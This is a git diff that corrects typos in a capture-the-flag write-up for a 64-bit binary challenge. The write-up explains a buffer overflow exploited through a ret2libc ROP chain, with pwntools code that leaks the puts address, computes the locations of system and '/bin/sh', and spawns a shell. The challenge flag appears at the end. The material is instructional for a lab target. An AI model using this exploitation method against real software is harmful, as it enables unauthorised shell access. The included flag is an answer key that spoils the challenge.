@@ -4,11 +4,13 @@ First, I decompiled the binary in dogbolt:
 
 <img src="https://github.com/raul-dunca/CyberStudents-advent-of-ctf2024/blob/main/.assets/day_16_info.png">
 
-Its a simple program, but there is a buffer overflow at `fgets(&buf, 0x80, stdin);`, where 128 bytes are read inside buf, which is a type void. There is no win function so I used ROP. The file is also a 64 bit executable, which is important to keep in mind. First I tried to find the correct offset using the same approach as in the previous binary challange ([day10]()). Basically 
-I used `cyclic_find` to which I added 8 bytes (size of RBP) and the final offset was `72`. Alright, now my ideas was to leak the puts address, which then will help me calculate the base address of libc. This is needed since ASLR is enabeled. Since this was a 64 bit executable (remember!?) we also need to be carefull how parameters are passed to functions. Basically a ROP gadget is needed to pop the value of RDI (throught which function parameters are passed). To find one I used:
+It is a simple program, but there is a buffer overflow at `fgets(&buf, 0x80, stdin);`, where 128 bytes are read inside `buf`, which is of type void. There is no win function, so I used ROP. The file is also a 64 bit executable, which is important to keep in mind. First I tried to find the correct offset using the same approach as in the previous binary challenge ([day10](https://github.com/raul-dunca/CyberStudents-advent-of-ctf2024/blob/main/Day10/flag_from_wish.md)). Basically 
+I used `cyclic_find` to which I added 8 bytes (size of RBP) and the final offset was `72`. Alright, now my idea was to leak the puts address, which then will help me calculate the base address of libc. This is needed since ASLR is enabled. Since this was a 64 bit executable (remember!?) we also need to be carefull how parameters are passed to functions. Basically, a ROP gadget is needed to pop the value of RDI (thought which function parameters are passed). To find one, I used:
+
 ```bash
 ROPgadget --binary main | grep "pop rdi"
 ```
+
 Now, we just need to put the value we want to print (in this case is the memory address of puts) in RDI and then put the function call on the stack. Finally, we need to re-run the main function, so we can do the actual exploit and get the shell.  Here is the exploit described so far:
 ```python
 from pwn import *
@@ -30,8 +32,8 @@ payload += p64(puts_got)
 payload += p64(puts_plt)                 
 payload += p64(main_addr)
 ```
-Sending the payload now, a line is returned which shows us what we entered and at the end the leaked puts address, so its important to parse this correctly to get the correct address. I definitely made my approach more complicated than it needed to be:
 
+Sending the payload now, a line is returned which shows us what we entered and at the end the leaked puts address, so it is important to parse this correctly to get the correct address. I definitely made my approach more complicated than it needed to be:
 
 ```python
 p = process('./main')          
@@ -53,9 +55,9 @@ leaked_puts = int.from_bytes(result_without_last_byte, byteorder='little')
 
 ```
 
-I transform the data to hex and look at the bytes after the `96 11 40` sequence which is the address of pop_rdi_ret, but in little endian. Then I just delete the last byte which is the `\n` character and transofrmed the addres to big endian and then make it an integer value.
+I transformed the data to hex and look at the bytes after the `96 11 40` sequence which is the address of pop_rdi_ret, but in little endian. Then I just deleted the last byte which is the `\n` character and transformed the address to big endian and then make it an integer value.
 
-Now, I can calculate the value of the base libc by substracting from the memory address of puts, the offset of puts. With the base libc I can calculate the memory address of the `system` function and the `\bin\sh` string:
+Now, I can calculate the value of the base libc by subtracting from the memory address of puts, the offset of puts. With the base libc I can calculate the memory address of the `system` function and the `\bin\sh` string:
 
 ```python
 libc_base = leaked_puts - libc.symbols['puts']
@@ -63,7 +65,8 @@ system_addr = libc_base + libc.symbols['system']
 bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
 
 ```
-Finally we craft the exploit in a similar manner as for the first step, with the only difference being the addition of a ret gadget, which is used for stack alignment.
+
+Finally, I crafted the exploit in a similar manner as for the first step, with the only difference being the addition of a ret gadget, which is used for stack alignment.
 
 ```python
 ret = rop.find_gadget(['ret'])[0] 
@@ -79,7 +82,7 @@ p.sendline(payload)
 p.interactive() 
 ```
 
-Then we get a shell and thus the flag if we connect remote. Below is my final complete script with some addtional prints:
+Then we get a shell and thus the flag if we connect remote. Below is my final complete script with some additional prints:
 
 ```python
 from pwn import *
@@ -168,7 +171,7 @@ p.interactive()
 
 ```
 
-An important note is to remember to use `pwnutils` for the local exploit when the libc is given, I personally did not know that and I had the correct script locally, but of course it didn't work because it's not loading the correct libc. So just putting the executable and libc file in the same directory is not enough !!!
+An important note is to remember to use `pwnutils` for the local exploit when the libc is given, I personally did not know that and, I had the correct script locally, but of course it didn't work because it's not loading the correct libc. So, just putting the executable and libc file in the same directory is not enough !
 
 
 `csd{J1Ngl3_b3ll_r0CK_15_b357_XM45_50NG}`
